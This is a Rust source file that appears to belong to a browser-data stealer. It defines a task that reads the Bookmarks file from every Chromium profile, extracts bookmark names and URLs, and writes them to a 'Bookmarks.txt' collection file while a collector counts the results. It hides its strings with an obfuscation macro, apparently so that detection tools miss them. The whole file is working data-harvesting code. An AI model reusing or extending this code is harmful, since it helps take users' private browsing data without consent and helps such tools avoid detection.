use crate::alloc::borrow::ToOwned;
use crate::chromium::BrowserData;
use crate::{collect_from_all_profiles, to_string_and_write_all, Bookmark};
use alloc::sync::Arc;
use alloc::vec;
use alloc::vec::Vec;
use collector::{Browser, Collector};
use filesystem::path::Path;
use filesystem::storage::StorageFileSystem;
use filesystem::FileSystem;
use json::{parse, Value};
use obfstr::obfstr as s;
use tasks::{parent_name, Task};

pub(super) struct BookmarksTask {
    browser: Arc<BrowserData>,
}

impl BookmarksTask {
    pub(super) fn new(browser: Arc<BrowserData>) -> Self {
        Self { browser }
    }
}

impl<C: Collector, F: FileSystem> Task<C, F> for BookmarksTask {
    parent_name!("Bookmarks.txt");

    fn run(&self, parent: &Path, filesystem: &F, collector: &C) {
        let Some(bookmarks) = collect_from_all_profiles(&self.browser.profiles, |profile| {
            read_bookmarks(&StorageFileSystem, profile)
        }) else {
            return;
        };

        collector
            .get_browser()
            .increase_bookmarks_by(bookmarks.len());
        let _ = to_string_and_write_all(&bookmarks, "\n\n", filesystem, parent);
    }
}

fn read_bookmarks<F>(filesystem: &F, profile: &Path) -> Option<Vec<Bookmark>>
where
    F: FileSystem,
{
    let content = filesystem.read_file(profile / s!("Bookmarks")).ok()?;
    let json = parse(&content).ok()?;

    let roots = json.get(s!("roots"))?;

    let bookmarks: Vec<Bookmark> = [s!("bookmark_bar"), s!("other"), s!("synced")]
        .iter()
        .filter_map(|root| roots.get(root.as_ref()))
        .flat_map(extract_bookmarks)
        .collect();

    Some(bookmarks)
}

fn extract_bookmarks(root: &Value) -> Vec<Bookmark> {
    let mut bookmarks = Vec::new();
    let mut stack = vec![root];

    while let Some(current) = stack.pop() {
        if let Some(obj) = current.as_object() {
            if let (Some(name_val), Some(url_val)) = (obj.get("name"), obj.get("url"))
                && let (Some(name), Some(url)) = (name_val.as_string(), url_val.as_string())
            {
                bookmarks.push(Bookmark {
                    name: name.clone(),
                    url: url.clone(),
                });
            }

            if let Some(children_val) = obj.get("children")
                && let Some(children) = children_val.as_array()
            {
                for child in children.iter().rev() {
                    stack.push(child);
                }
            }
        }
    }

    bookmarks
}
